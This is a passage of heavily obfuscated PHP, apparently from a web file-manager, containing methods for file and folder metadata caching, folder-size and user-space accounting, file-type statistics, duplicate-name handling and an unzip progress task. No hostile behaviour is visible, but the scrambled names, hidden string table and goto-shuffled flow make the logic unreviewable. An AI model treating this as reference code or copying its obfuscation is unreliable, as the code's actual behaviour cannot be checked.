$this->fileInfoGet($B»ˆø¤Í¨Ÿ); if (!$AÔñª…”¤) { return !1; } return IO::fileSubstr($AÔñª…”¤[$_SERVER[Ä¿Ş°¨][75]], $C–Ò †Û¹å, $D¼øÛëÒ¾Ş); } public function fileInfoGet($fÀœšÔàä¿) { goto BÒçöŒ§‚Ä; Bè‰„ö½É: $dµéàĞÀÓ = Model($AˆùÒ’—º[426])->fileInfo($d–ô‹ÔÚŸß[$AˆùÒ’—º[423]]); if ($dµéàĞÀÓ) { $dµéàĞÀÓ[$AˆùÒ’—º[28]] = $d–ô‹ÔÚŸß[$AˆùÒ’—º[28]]; } self::$cacheFileInfo[$A„Ï‰×Ç¨Œ] = $dµéàĞÀÓ; goto C–™øƒÚ—¸; EæÃ“Û÷¿¨: $A„Ï‰×Ç¨Œ = $AˆùÒ’—º[429] . $d–ô‹ÔÚŸß[$AˆùÒ’—º[423]]; $B¨á½£†ß· = _get(self::$cacheFileInfo, $A„Ï‰×Ç¨Œ); if ($B¨á½£†ß·) { return $B¨á½£†ß·; } goto Bè‰„ö½É; C–™øƒÚ—¸: return $dµéàĞÀÓ; goto dÅÒ¦®Ò™Ù; BÒçöŒ§‚Ä: $AˆùÒ’—º =& $_SERVER[Ä¿Ş°¨]; $d–ô‹ÔÚŸß = $this->sourceInfo($fÀœšÔàä¿); if (!$d–ô‹ÔÚŸß || $d–ô‹ÔÚŸß[$AˆùÒ’—º[375]]) { return !1; } goto EæÃ“Û÷¿¨; dÅÒ¦®Ò™Ù: } private function folderChildrenNumber($dÓ¶ŸàÄ‚ô) { $C‚Üíáğ‰× =& $_SERVER[Ä¿Ş°¨]; $fí²ì‹¶ÏÜ = $this->sourceInfo($dÓ¶ŸàÄ‚ô); $dÊ£Œ¢‘‰š = array($C‚Üíáğ‰×[529] => array($C‚Üíáğ‰×[487], $fí²ì‹¶ÏÜ[$C‚Üíáğ‰×[463]] . $dÓ¶ŸàÄ‚ô . $C‚Üíáğ‰×[488]), $C‚Üíáğ‰×[400] => intval($fí²ì‹¶ÏÜ[$C‚Üíáğ‰×[401]]), $C‚Üíáğ‰×[522] => 1); $cĞóà¢„¡ = $this->where($dÊ£Œ¢‘‰š)->count(); $cÅø­ÄÆ˜Ó = $this->where($dÊ£Œ¢‘‰š)->where(array($C‚Üíáğ‰×[522] => 0))->count(); return array($C‚Üíáğ‰×[81] => $cÅø­ÄÆ˜Ó, $C‚Üíáğ‰×[82] => $cĞóà¢„¡); } public function pathInfo($CÜÆ³¹É‰Ô, $aÖ¥Ñ‡¢Ê» = false) { goto B‘¹›çÍ; Bàñ¹—ßÉõ: $Dš›Ÿ¨â³İ = $this->_listDataApplyItem($Dš›Ÿ¨â³İ, $aÖ¥Ñ‡¢Ê»); self::$cachePathInfo[$C¬…—”éŒ] = $Dš›Ÿ¨â³İ; return $Dš›Ÿ¨â³İ; goto cï‡¶¸ß˜­; B‘¹›çÍ: $AË™ÈÆÛ¬Ë =& $_SERVER[Ä¿Ş°¨]; $C¬…—”éŒ = $AË™ÈÆÛ¬Ë[415] . intval($aÖ¥Ñ‡¢Ê») . $AË™ÈÆÛ¬Ë[416] . $CÜÆ³¹É‰Ô; $Cˆî§‚ƒ•ß = _get(self::$cachePathInfo, $C¬…—”éŒ); goto b’šÛ¯íİ; b’šÛ¯íİ: if ($Cˆî§‚ƒ•ß) { return $Cˆî§‚ƒ•ß; } $Dš›Ÿ¨â³İ = $this->sourceInfo($CÜÆ³¹É‰Ô); if (!$Dš›Ÿ¨â³İ) { return !1; } goto Bàñ¹—ßÉõ; cï‡¶¸ß˜­: } public static $cachePathInfoMore = array(); public function pathInfoMore($Cï•Ÿ®…„) { goto e¿‘â”‹ã; aƒ½¯ÖÎÓ: self::$cachePathInfoMore[$Cï•Ÿ®…„] = $cğò»àÓÉø; return $cğò»àÓÉø; goto Dì’„Â‹ê; e¿‘â”‹ã: $DÓ–‘Ş È =& $_SERVER[Ä¿Ş°¨]; $eˆñŠŒ ‚² = _get(self::$cachePathInfoMore, $Cï•Ÿ®…„); if ($eˆñŠŒ ‚²) { return $eˆñŠŒ ‚²; } goto FºñÖˆæá; FºñÖˆæá: $cğò»àÓÉø = $this->pathInfo($Cï•Ÿ®…„); if (!$cğò»àÓÉø) { return !1; } if ($cğò»àÓÉø[$DÓ–‘Ş È[375]] == $DÓ–‘Ş È[83]) { $cğò»àÓÉø[$DÓ–‘Ş È[80]] = $this->folderChildrenNumber($Cï•Ÿ®…„); } goto aƒ½¯ÖÎÓ; Dì’„Â‹ê: } public function sourceInfo($B­â—¿ˆØâ) { goto EÁÖ‰¡ÚÓË; E»æ¹àĞ¡: $Bõ÷Ô£ƒ¼ = _get(self::$cacheSourceInfo, $fãÑ¬Ô¼—±); if ($Bõ÷Ô£ƒ¼) { return $Bõ÷Ô£ƒ¼; } $EÚœ‘ïÊô¶ = $this->where(array($a’ öšÈÕ[374] => $B­â—¿ˆØâ))->find(); goto Fãò›­µø‡; EÁÖ‰¡ÚÓË: $a’ öšÈÕ =& $_SERVER[Ä¿Ş°¨]; if (!$B­â—¿ˆØâ) { return array(); } $fãÑ¬Ô¼—± = $a’ öšÈÕ[414] . $B­â—¿ˆØâ; goto E»æ¹àĞ¡; Fãò›­µø‡: self::$cacheSourceInfo[$fãÑ¬Ô¼—±] = $EÚœ‘ïÊô¶; return self::$cacheSourceInfo[$fãÑ¬Ô¼—±]; goto aŠíÇ»•ƒ§; aŠíÇ»•ƒ§: } public function sourceCacheClear($Fê…ÀÜ³±‹ = false) { if ($Fê…ÀÜ³±‹ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Ä¿Ş°¨][414] . $Fê…ÀÜ³±‹]); } public function pathInfoByPath($e¥Õ™¥´è, $bÆÚµñä‘¢) { $b™óòÁéËÌ =& $_SERVER[Ä¿Ş°¨]; $EõÊšßÛ ³ = !$bÆÚµñä‘¢ ? array() : explode($b™óòÁéËÌ[8], trim($bÆÚµñä‘¢, $b™óòÁéËÌ[8])); $FÜ”‚İÑ‡ = $e¥Õ™¥´è; foreach ($EõÊšßÛ ³ as $AºÖ‰¿ÄÁµ) { $CÚêÔÑ—í¡ = array($b™óòÁéËÌ[465] => $FÜ”‚İÑ‡, $b™óòÁéËÌ[28] => $AºÖ‰¿ÄÁµ); $CÊ—ØÃ“Îô = $this->where($CÚêÔÑ—í¡)->select(); if (!$CÊ—ØÃ“Îô) { return !1; } $CÊ—ØÃ“Îô = array_sort_by($CÊ—ØÃ“Îô, $b™óòÁéËÌ[401]); $FÜ”‚İÑ‡ = $CÊ—ØÃ“Îô[0][$b™óòÁéËÌ[374]]; } return $this->pathInfo($FÜ”‚İÑ‡, !0); } protected function updateModifyTime($c·ç¢œ‚òŞ) { goto eéŠ³Ã‡Ûº; EİØéøˆ¤ğ: $this->where($BÜŒÀï©¯æ)->save($B«ƒÚÍÕÑö); goto f§ïÏùÀ¨; eéŠ³Ã‡Ûº: $f®†¦×Æ´„ =& $_SERVER[Ä¿Ş°¨]; if (!$c·ç¢œ‚òŞ) { return; } if (!is_array($c·ç¢œ‚òŞ)) { $c·ç¢œ‚òŞ = array($c·ç¢œ‚òŞ); } goto C©¸£ ƒÒ; C©¸£ ƒÒ: foreach ($c·ç¢œ‚òŞ as $C¡…ô¢‚¹ã => $DÍœé¾’†®) { $c·ç¢œ‚òŞ[$C¡…ô¢‚¹ã] = intval($DÍœé¾’†®); } $BÜŒÀï©¯æ = array($f®†¦×Æ´„[374] => array($f®†¦×Æ´„[7], $c·ç¢œ‚òŞ)); $B«ƒÚÍÕÑö = array($f®†¦×Æ´„[528] => USER_ID, $f®†¦×Æ´„[395] => time()); goto EİØéøˆ¤ğ; f§ïÏùÀ¨: } public function folderSizeReset($Bá¯±©‡¼İ) { goto FÜÔ£ÈÓæ; F­Ü¾¹Ù‡è: $BĞïµŒ›Äƒ = $this->parentLevelArray($bÌ·ãì¬Ò[$fù÷ßÛÈ[463]]); if ($BĞïµŒ›Äƒ) { $B¼æğñ°ÇÏ = array($fù÷ßÛÈ[374] => array($fù÷ßÛÈ[389], $BĞïµŒ›Äƒ)); if ($D÷Ä·åÜÓ¢ < 0) { $B¼æğñ°ÇÏ[$fù÷ßÛÈ[77]] = array($fù÷ßÛÈ[916], abs($D÷Ä·åÜÓ¢)); } $this->where($B¼æğñ°ÇÏ)->setAdd($fù÷ßÛÈ[77], $D÷Ä·åÜÓ¢); } $this->targetSpaceUpdate($bÌ·ãì¬Ò[$fù÷ßÛÈ[376]], $bÌ·ãì¬Ò[$fù÷ßÛÈ[460]]); goto f‚ô¹èƒ‚¿; f‹éÑñ‰†Ø: $D÷Ä·åÜÓ¢ = $aÁá¬©›¦ô - intval($bÌ·ãì¬Ò[$fù÷ßÛÈ[77]]); if ($D÷Ä·åÜÓ¢ == 0) { return CacheLock::unlock($C¢÷¨Û¼´¾); } $this->where(array($fù÷ßÛÈ[388] => $Bá¯±©‡¼İ))->setField($fù÷ßÛÈ[77], $aÁá¬©›¦ô); goto F­Ü¾¹Ù‡è; f‚ô¹èƒ‚¿: CacheLock::unlock($C¢÷¨Û¼´¾); goto B´²…ìÁ‘Á; A¬Ú½Ÿ¿‹Ì: $B¼æğñ°ÇÏ = array($fù÷ßÛÈ[373] => $Bá¯±©‡¼İ, $fù÷ßÛÈ[400] => 0); $aÁá¬©›¦ô = $this->where($B¼æğñ°ÇÏ)->sum($fù÷ßÛÈ[77]); $aÁá¬©›¦ô = intval($aÁá¬©›¦ô); goto f‹éÑñ‰†Ø; FÜÔ£ÈÓæ: $fù÷ßÛÈ =& $_SERVER[Ä¿Ş°¨]; if ($this->statusIgnoreResetSpace) { return; } $C¢÷¨Û¼´¾ = $fù÷ßÛÈ[2305] . $Bá¯±©‡¼İ; goto c›ÌÃóÜ²; c›ÌÃóÜ²: CacheLock::lock($C¢÷¨Û¼´¾, 20); $this->sourceCacheClear($Bá¯±©‡¼İ); $bÌ·ãì¬Ò = $this->sourceInfo($Bá¯±©‡¼İ); goto A¬Ú½Ÿ¿‹Ì; B´²…ìÁ‘Á: } public function folderSizeResetChildren($dª¿‡‚Œ¡Ã) { goto d¡ä¿ğºÁ; F¬òŞ¹­­Ó: $d©¡¨œîá = array($e©Ñ¢ªœô¼[522] => 1, $e©Ñ¢ªœô¼[529] => array($e©Ñ¢ªœô¼[487], $F§¼£‚ßö÷[$e©Ñ¢ªœô¼[463]] . $dª¿‡‚Œ¡Ã . $e©Ñ¢ªœô¼[488])); $Cš…§Ò‘·’ = $e©Ñ¢ªœô¼[2306]; $FÓ›îÑµ Ï = $this->field($Cš…§Ò‘·’)->where($d©¡¨œîá)->select(); goto B»Ç¯œ¢Íì; d¡ä¿ğºÁ: $e©Ñ¢ªœô¼ =& $_SERVER[Ä¿Ş°¨]; $this->sourceCacheClear($dª¿‡‚Œ¡Ã); $F§¼£‚ßö÷ = $this->sourceInfo($dª¿‡‚Œ¡Ã); goto F¬òŞ¹­­Ó; bŸİ¹ƒ„‘: foreach ($FÓ›îÑµ Ï as $Cœù¬Ûòö) { if ($Cœù¬Ûòö[$e©Ñ¢ªœô¼[77]] == $Cœù¬Ûòö[$e©Ñ¢ªœô¼[2307]]) { continue; } $fÃ¹¡¸ó¸[] = array($e©Ñ¢ªœô¼[374], $Cœù¬Ûòö[$e©Ñ¢ªœô¼[374]], $e©Ñ¢ªœô¼[77], $Cœù¬Ûòö[$e©Ñ¢ªœô¼[77]]); } $this->saveAll($fÃ¹¡¸ó¸); goto C­á…áååø; B»Ç¯œ¢Íì: $d©¡¨œîá[$e©Ñ¢ªœô¼[375]] = 0; $bè×‡©÷®Ğ = $this->field($Cš…§Ò‘·’)->where($d©¡¨œîá)->select(); if (!$bè×‡©÷®Ğ) { return; } goto f¦£¤ğí´³; f¦£¤ğí´³: $FÓ›îÑµ Ï[] = $F§¼£‚ßö÷; $FÓ›îÑµ Ï = array_to_keyvalue($FÓ›îÑµ Ï, $e©Ñ¢ªœô¼[374]); foreach ($FÓ›îÑµ Ï as $FŒÍõ‚äì‘ => $Cœù¬Ûòö) { $FÓ›îÑµ Ï[$FŒÍõ‚äì‘][$e©Ñ¢ªœô¼[2307]] = $FÓ›îÑµ Ï[$FŒÍõ‚äì‘][$e©Ñ¢ªœô¼[77]]; $FÓ›îÑµ Ï[$FŒÍõ‚äì‘][$e©Ñ¢ªœô¼[77]] = 0; } goto d„¶Ëøîñ; d„¶Ëøîñ: foreach ($bè×‡©÷®Ğ as $Cœù¬Ûòö) { $EãÅ×ùÛï• = $Cœù¬Ûòö[$e©Ñ¢ªœô¼[465]] . $e©Ñ¢ªœô¼[33]; if (!isset($FÓ›îÑµ Ï[$EãÅ×ùÛï•])) { continue; } if ($Cœù¬Ûòö[$e©Ñ¢ªœô¼[401]] == $FÓ›îÑµ Ï[$EãÅ×ùÛï•][$e©Ñ¢ªœô¼[401]]) { $FÓ›îÑµ Ï[$EãÅ×ùÛï•][$e©Ñ¢ªœô¼[77]] += $Cœù¬Ûòö[$e©Ñ¢ªœô¼[77]]; } } foreach ($FÓ›îÑµ Ï as $Cœù¬Ûòö) { $e×ç»…‡Œ = $this->parentLevelArray($Cœù¬Ûòö[$e©Ñ¢ªœô¼[463]]); foreach ($e×ç»…‡Œ as $EãÅ×ùÛï•) { $EãÅ×ùÛï• = $EãÅ×ùÛï• . $e©Ñ¢ªœô¼[33]; if (!isset($FÓ›îÑµ Ï[$EãÅ×ùÛï•])) { continue; } if ($Cœù¬Ûòö[$e©Ñ¢ªœô¼[401]] == $FÓ›îÑµ Ï[$EãÅ×ùÛï•][$e©Ñ¢ªœô¼[401]]) { $FÓ›îÑµ Ï[$EãÅ×ùÛï•][$e©Ñ¢ªœô¼[77]] += $Cœù¬Ûòö[$e©Ñ¢ªœô¼[77]]; } } } $fÃ¹¡¸ó¸ = array(); goto bŸİ¹ƒ„‘; C­á…áååø: } public function userSpaceReset($aå‰ÖòŒ…¤ = false) { $bŠ†”‹åÀÔ =& $_SERVER[Ä¿Ş°¨]; $b­ Š•Ÿó = $this->where(array($bŠ†”‹åÀÔ[376] => self::TYPE_USER, $bŠ†”‹åÀÔ[460] => $aå‰ÖòŒ…¤, $bŠ†”‹åÀÔ[375] => 0))->sum($bŠ†”‹åÀÔ[77]); Model($bŠ†”‹åÀÔ[478])->userEdit($aå‰ÖòŒ…¤, array($bŠ†”‹åÀÔ[2049] => $b­ Š•Ÿó)); } public function targetSpaceUpdate($F•ñ¯Ğ¬—è, $d æ±À‡ê) { $FÃƒİºø® =& $_SERVER[Ä¿Ş°¨]; if (!$d æ±À‡ê) { return; } if (!in_array($F•ñ¯Ğ¬—è, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $B‹İ¿ß˜¶ë = $this->targetSpaceSize($F•ñ¯Ğ¬—è, $d æ±À‡ê); if ($F•ñ¯Ğ¬—è == self::TYPE_USER) { Model($FÃƒİºø®[478])->userEdit($d æ±À‡ê, array($FÃƒİºø®[2049] => $B‹İ¿ß˜¶ë)); } else { if ($F•ñ¯Ğ¬—è == self::TYPE_GROUP) { Model($FÃƒİºø®[462])->groupEdit($d æ±À‡ê, array($FÃƒİºø®[2049] => $B‹İ¿ß˜¶ë)); } } } public function targetSpaceSize($B††çÄ“é‰, $eÔÔÛ¤èå) { goto FÆ“Ô·‰‹; FÆ“Ô·‰‹: $eÑªçğ¬Æ« =& $_SERVER[Ä¿Ş°¨]; $Bòå›ñğë = $this->sourceRoot($B††çÄ“é‰, $eÔÔÛ¤èå, !0); if (!$Bòå›ñğë) { return 0; } goto EÅ¥ßÊÉÑ; BæÊ ÙÓË˜: return $AÒÎÔì¦; goto e‘œÍ¬ˆÚİ; a˜ÏÒ³ÁÇĞ: $e…ŸÕÇÉ© = array_to_keyvalue($e…ŸÕÇÉ©, $eÑªçğ¬Æ«[33], $eÑªçğ¬Æ«[374]); $e…ŸÕÇÉ© = array_unique(array_filter($e…ŸÕÇÉ©)); if ($e…ŸÕÇÉ©) { $AĞÕ¨ô‡² = array($eÑªçğ¬Æ«[388] => array($eÑªçğ¬Æ«[389], $e…ŸÕÇÉ©)); $AÒÎÔì¦ += floatval($this->where($AĞÕ¨ô‡²)->sum($eÑªçğ¬Æ«[77])); } goto BæÊ ÙÓË˜; EÅ¥ßÊÉÑ: $AÒÎÔì¦ = floatval($Bòå›ñğë[$eÑªçğ¬Æ«[77]]); $AĞÕ¨ô‡² = array($eÑªçğ¬Æ«[529] => array($eÑªçğ¬Æ«[487], $eÑªçğ¬Æ«[474] . $Bòå›ñğë[$eÑªçğ¬Æ«[374]] . $eÑªçğ¬Æ«[488])); $e…ŸÕÇÉ© = Model($eÑªçğ¬Æ«[399])->field($eÑªçğ¬Æ«[388])->where($AĞÕ¨ô‡²)->select(); goto a˜ÏÒ³ÁÇĞ; e‘œÍ¬ˆÚİ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($CìÜâ­¶®¯) { return $this->fileTypeProfile($CìÜâ­¶®¯, SourceModel::TYPE_USER); } public function groupFileTypeProfile($F“ôÁÖÒÉ‡) { return $this->fileTypeProfile($F“ôÁÖÒÉ‡, SourceModel::TYPE_GROUP); } private function fileTypeProfile($F¾‡É´Ø†, $E©‚ƒÇåÓ) { goto DùöšÕ¢; B´ÑØ¹Ê°¹: $Bêõ¡œ‘Å = array(); $Bêõ¡œ‘Å[$CÔ×î¸ÛøÔ[2309]] = array($CÔ×î¸ÛøÔ[2310] => LNG($CÔ×î¸ÛøÔ[2309]), $CÔ×î¸ÛøÔ[2311] => $this->where($dòî¶Ïšİ¸)->count(), $CÔ×î¸ÛøÔ[524] => $this->where($dòî¶Ïšİ¸)->sum($CÔ×î¸ÛøÔ[77])); $b‡ìÎæÒá = KodIO::fileTypeList(); goto d‘ÀÆÁĞ¡í; DùöšÕ¢: $CÔ×î¸ÛøÔ =& $_SERVER[Ä¿Ş°¨]; $dŠæØ‘Ë¬ = $CÔ×î¸ÛøÔ[2308] . $F¾‡É´Ø† . $CÔ×î¸ÛøÔ[70] . $E©‚ƒÇåÓ; $Eğ¼‰ÌŒê· = Cache::get($dŠæØ‘Ë¬); goto bæ‰Õ£Ç®˜; bæ‰Õ£Ç®˜: if ($Eğ¼‰ÌŒê·) { return $Eğ¼‰ÌŒê·; } $dòî¶Ïšİ¸ = array($CÔ×î¸ÛøÔ[522] => 0); if ($F¾‡É´Ø† != !1) { $dòî¶Ïšİ¸[$CÔ×î¸ÛøÔ[460]] = $F¾‡É´Ø†; $dòî¶Ïšİ¸[$CÔ×î¸ÛøÔ[376]] = $E©‚ƒÇåÓ; } goto B´ÑØ¹Ê°¹; d‘ÀÆÁĞ¡í: foreach ($b‡ìÎæÒá as $f¬½ ÷¦¸ => $cõÁïòÂ) { $dòî¶Ïšİ¸[$CÔ×î¸ÛøÔ[377]] = $this->fileTypeWhere($f¬½ ÷¦¸); $Bêõ¡œ‘Å[$f¬½ ÷¦¸] = array($CÔ×î¸ÛøÔ[2310] => $cõÁïòÂ[$CÔ×î¸ÛøÔ[28]], $CÔ×î¸ÛøÔ[2311] => $this->where($dòî¶Ïšİ¸)->count(), $CÔ×î¸ÛøÔ[524] => $this->where($dòî¶Ïšİ¸)->sum($CÔ×î¸ÛøÔ[77])); } Cache::set($dŠæØ‘Ë¬, $Bêõ¡œ‘Å, 1200); return $Bêõ¡œ‘Å; goto Aéê„â¹¬Œ; Aéê„â¹¬Œ: } public function fileNameExist($cØùòÖøÓ¸, $FÚ´ŠÉ¿ á) { $fÈ›áœë¹Ì =& $_SERVER[Ä¿Ş°¨]; $CÏ†ŒÕ‰»æ = $this->childList($cØùòÖøÓ¸); foreach ($CÏ†ŒÕ‰»æ as $aÍä™ƒ·ÔÇ) { if ($aÍä™ƒ·ÔÇ[$fÈ›áœë¹Ì[28]] == $FÚ´ŠÉ¿ á) { return $aÍä™ƒ·ÔÇ[$fÈ›áœë¹Ì[374]]; } } return !1; } public function childList($eøÓŸáéèÓ) { goto F‹ÍÒŞ¢„‚; DåÊø‡ášÎ: self::$cacheChildList[$dáâèô‡©] = $dÙ°Œ–˜Ù; foreach ($dÙ°Œ–˜Ù as $A‰¶ğè÷ÙÄ) { $dáâèô‡© = $eøÅ®šŸ„‰[414] . $A‰¶ğè÷ÙÄ[$eøÅ®šŸ„‰[374]]; self::$cacheSourceInfo[$dáâèô‡©] = $A‰¶ğè÷ÙÄ; } return $dÙ°Œ–˜Ù; goto E³‚š†Ú‰ã; F·Ã±ÙÓ¢Ö: $EöÍ”äù¯Ô = array($eøÅ®šŸ„‰[465] => intval($eøÓŸáéèÓ), $eøÅ®šŸ„‰[401] => 0); $dÙ°Œ–˜Ù = $this->where($EöÍ”äù¯Ô)->select(); $dÙ°Œ–˜Ù = $dÙ°Œ–˜Ù ? $dÙ°Œ–˜Ù : array(); goto DåÊø‡ášÎ; F‹ÍÒŞ¢„‚: $eøÅ®šŸ„‰ =& $_SERVER[Ä¿Ş°¨]; $dáâèô‡© = $eøÅ®šŸ„‰[2289] . $eøÓŸáéèÓ; if (isset(self::$cacheChildList[$dáâèô‡©])) { return self::$cacheChildList[$dáâèô‡©]; } goto F·Ã±ÙÓ¢Ö; E³‚š†Ú‰ã: } public function fileNameAuto($C…Ü Ã„, $DŠï¯Ü£óê, $A·°”Êå”Ì = REPEAT_RENAME, $EŠ”ºğÎæ§ = false) { $E‘ÒÇõ˜°² =& $_SERVER[Ä¿Ş°¨]; $céÛ§¿‡ = $this->childList($C…Ü Ã„); $fŸ¿øŞ†øÙ = array_to_keyvalue($céÛ§¿‡, $E‘ÒÇõ˜°²[33], $E‘ÒÇõ˜°²[28]); return $this->fileNameAutoGet($fŸ¿øŞ†øÙ, $DŠï¯Ü£óê, $A·°”Êå”Ì, $EŠ”ºğÎæ§); } public function fileNameAutoGet($C‰ö‡ë…óÊ, $Fˆà±ì²ğœ, $Bß•ÆÉî‰‘, $C‘çËê­‘Õ) { $B³ÆŒóˆŒï =& $_SERVER[Ä¿Ş°¨]; if ($Bß•ÆÉî‰‘ == REPEAT_REPLACE || !$C‰ö‡ë…óÊ || !in_array_not_case($Fˆà±ì²ğœ, $C‰ö‡ë…óÊ) || $C‘çËê­‘Õ && $Bß•ÆÉî‰‘ != REPEAT_RENAME_FOLDER) { return $Fˆà±ì²ğœ; } if ($Bß•ÆÉî‰‘ == REPEAT_SKIP) { return !1; } $cã©±£‘¨ = $B³ÆŒóˆŒï[91] . get_path_ext($Fˆà±ì²ğœ); $cã©±£‘¨ = $cã©±£‘¨ == $B³ÆŒóˆŒï[91] || $C‘çËê­‘Õ ? $B³ÆŒóˆŒï[33] : $cã©±£‘¨; for ($C«ãèé… = 1; $C«ãèé… <= count($C‰ö‡ë…óÊ) + 1; $C«ãèé…++) { $D£²ÕÏ…Ïç = substr($Fˆà±ì²ğœ, 0, strlen($Fˆà±ì²ğœ) - strlen($cã©±£‘¨)); $Bª†Ü®ßÅØ = $D£²ÕÏ…Ïç . "\50{$C«ãèé…}\51{$cã©±£‘¨}"; if (!in_array_not_case($Bª†Ü®ßÅØ, $C‰ö‡ë…óÊ)) { return $Bª†Ü®ßÅØ; } } } } goto EÓä†ëºÈ; A‚¬…õô¸À: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto fŒ¨ªÑ«”İ; fô±¢Äº¤¿: if (!$B°âÆÃù[$Dƒ‰ãˆ–Û[1304]]) { $B°âÆÃù[$Dƒ‰ãˆ–Û[1304]] = LNG($Dƒ‰ãˆ–Û[1468]); } goto cà…÷ÎŠ‹; bÓ¬…“­ºÜ: Hook::bind($Dƒ‰ãˆ–Û[1020], array($this, $Dƒ‰ãˆ–Û[1466])); $B°âÆÃù =& $this->task; $B°âÆÃù[$Dƒ‰ãˆ–Û[1467]] = $Dƒ‰ãˆ–Û[1025]; goto fô±¢Äº¤¿; fŒ¨ªÑ«”İ: $Dƒ‰ãˆ–Û =& $_SERVER[Ä¿Ş°¨]; parent::startAfter(); Hook::bind($Dƒ‰ãˆ–Û[1464], array($this, $Dƒ‰ãˆ–Û[1465])); goto bÓ¬…“­ºÜ; cà…÷ÎŠ‹: } protected function endAfter() { $e”öÆ¹Ëö« =& $_SERVER[Ä¿Ş°¨]; parent::endAfter(); Hook::unbind($e”öÆ¹Ëö«[1464], array($this, $e”öÆ¹Ëö«[1465])); Hook::unbind($e”öÆ¹Ëö«[1020], array($this, $e”öÆ¹Ëö«[1466])); } public function updateAfter() { $fºàĞæ×¨ =& $_SERVER[Ä¿Ş°¨]; $FëÏµ³òŞÚ =& $this->task; if (!$FëÏµ³òŞÚ[$fºàĞæ×¨[963]] || !$FëÏµ³òŞÚ[$fºàĞæ×¨[692]]) { return; } if ($FëÏµ³òŞÚ[$fºàĞæ×¨[1467]] == $fºàĞæ×¨[1025]) { $DÈ®º‘©Ë = 0; if ($FëÏµ³òŞÚ[$fºàĞæ×¨[1444]]) { $DÈ®º‘©Ë = $FëÏµ³òŞÚ[$fºàĞæ×¨[1445]] / $FëÏµ³òŞÚ[$fºàĞæ×¨[1444]]; } $FëÏµ³òŞÚ[$fºàĞæ×¨[1400]] = $DÈ®º‘©Ë * 0.3; } else { if ($FëÏµ³òŞÚ[$fºàĞæ×¨[1467]] == $fºàĞæ×¨[297]) { $DÈ®º‘©Ë = $FëÏµ³òŞÚ[$fºàĞæ×¨[975]] / $FëÏµ³òŞÚ[$fºàĞæ×¨[963]]; $FëÏµ³òŞÚ[$fºàĞæ×¨[1400]] = 0.3 + $DÈ®º‘©Ë * 0.4; } else { if ($FëÏµ³òŞÚ[$fºàĞæ×¨[1467]] == $fºàĞæ×¨[102]) { $A´ĞÜ‘¬½É = 0; if ($FëÏµ³òŞÚ[$fºàĞæ×¨[1446]] == $fºàĞæ×¨[102]) { $A´ĞÜ‘¬½É = $FëÏµ³òŞÚ[$fºàĞæ×¨[1445]]; } $DÈ®º‘©Ë = ($FëÏµ³òŞÚ[$fºàĞæ×¨[1449]] + $A´ĞÜ‘¬½É) / $FëÏµ³òŞÚ[$fºàĞæ×¨[692]]; $FëÏµ³òŞÚ[$fºàĞæ×¨[1400]] = 0.3 + 0.4 + $DÈ®º‘©Ë * 0.3; } } } if ($FëÏµ³òŞÚ[$fºàĞæ×¨[1400]] > 0) { $aÔò›æ¼Á = timeFloat() - $FëÏµ³òŞÚ[$fºàĞæ×¨[1402]] - $FëÏµ³òŞÚ[$fºàĞæ×¨[1405]]; $FëÏµ³òŞÚ[$fºàĞæ×¨[1406]] = $aÔò›æ¼Á * (1 - $FëÏµ³òŞÚ[$fºàĞæ×¨[1400]]) / $FëÏµ³òŞÚ[$fºàĞæ×¨[1400]]; } } public function addFile($B‘—‘ÙÊ) { goto Bê¼‡ÆñÈ; E·Óñ­Ä´: $EÉÎ‡øíš[$f®™©éğ…[1442]] = $AšëôˆİîÕ[$f®™©éğ…[28]]; $EÉÎ‡øíš[$f®™©éğ…[1444]] = $AšëôˆİîÕ[$f®™©éğ…[77]]; $EÉÎ‡øíš[$f®™©éğ…[1445]] = 0; goto D»Ê–î¯Í; D»Ê–î¯Í: $EÉÎ‡øíš[$f®™©éğ…[965]] = $f®™©éğ…[1457]; $EÉÎ‡øíš[$f®™©éğ…[1446]] = $f®™©éğ…[1025]; $EÉÎ‡øíš[$f®™©éğ…[692]] = $AšëôˆİîÕ[$f®™©éğ…[77]]; goto Aî˜ã¶ÃÛ; Bê¼‡ÆñÈ: $f®™©éğ… =& $_SERVER[Ä¿Ş°¨]; $EÉÎ‡øíš =& $this->task; $AšëôˆİîÕ = IO::info($B‘—‘ÙÊ); goto E·Óñ­Ä´; fíË¡•‡·: $this->update(); goto aÙÙäƒÆğÖ; Aî˜ã¶ÃÛ: $EÉÎ‡øíš[$f®™©éğ…[963]] = 1; $B‘ñÕ×…¢ï = 0; $EÉÎ‡øíš[$f®™©éğ…[1450]] = array($f®™©éğ…[1451] => $B‘ñÕ×…¢ï + 1, $f®™©éğ…[391] => $AšëôˆİîÕ[$f®™©éğ…[28]], $f®™©éğ…[75] => $AšëôˆİîÕ[$f®™©éğ…[75]], $f®™©éğ…[470] => $AšëôˆİîÕ[$f®™©éğ…[470]] ? $AšëôˆİîÕ[$f®™©éğ…[470]] : $AšëôˆİîÕ[$f®™©éğ…[75]]); goto fíË¡•‡·; aÙÙäƒÆğÖ: } public function unzipAfter($fÉ‰èœÚë¾) { goto bŞ”ÅĞÄ…; bŞ”ÅĞÄ…: $FŞ´’ÇÇÀ =& $_SERVER[Ä¿Ş°¨]; $D®º‡âÎòš =& $this->task; $D®º‡âÎòš[$FŞ´’ÇÇÀ[1467]] = $FŞ´’ÇÇÀ[102]; goto eßˆ»Õ¨ ; e§Ú£Œë¶: if ($bÊÈ™Ù¢ùÜ[$FŞ´’ÇÇÀ[29]] == $FŞ´’ÇÇÀ[163]) { $D®º‡âÎòš[$FŞ´’ÇÇÀ[963]] = 1; } else { $D®º‡âÎòš[$FŞ´’ÇÇÀ[963]] = $bÊÈ™Ù¢ùÜ[$FŞ´’ÇÇÀ[80]][$FŞ´’ÇÇÀ[78]]; } $D®º‡âÎòš[$FŞ´’ÇÇÀ[965]] = $FŞ´’ÇÇÀ[33]; $D®º‡âÎòš[$FŞ´’ÇÇÀ[1446]] = 0; goto A¦âê‚¦µÇ; D†õáÓÉ: $D®º‡âÎòš[$FŞ´’ÇÇÀ[1442]] = $FŞ´’ÇÇÀ[33]; $D®º‡âÎòš[$FŞ´’ÇÇÀ[1449]] = 0; $D®º‡âÎòš[$FŞ´’ÇÇÀ[692]] = $bÊÈ™Ù¢ùÜ[$FŞ´’ÇÇÀ[77]]; goto cÁùœè›’Ş; 